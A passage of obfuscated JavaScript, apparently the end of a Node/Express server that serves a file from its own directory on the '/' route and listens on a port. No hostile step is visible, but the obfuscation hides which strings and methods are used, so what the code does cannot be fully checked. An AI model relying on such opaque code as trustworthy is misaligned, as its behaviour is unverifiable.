_0x5807f1=_0x12d900;console[_0x5807f1(0x26a)]('Unhandled\x20error\x20in\x20startserver:',_0x41ec10);}),app[_0x12d900(0x1ec)]('/',async function(_0x2e95c1,_0xd0882e){const _0x31d40f=_0x12d900;try{const _0x102a91=path['join'](__dirname,_0x31d40f(0x201)),_0x41ddf7=await fs[_0x31d40f(0x283)][_0x31d40f(0x1f4)](_0x102a91,_0x31d40f(0x273));_0xd0882e['send'](_0x41ddf7);}catch(_0x143e21){_0xd0882e[_0x31d40f(0x1fa)](_0x31d40f(0x233));}}),app[_0x12d900(0x245)](PORT,()=>console[_0x12d900(0x1f1)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
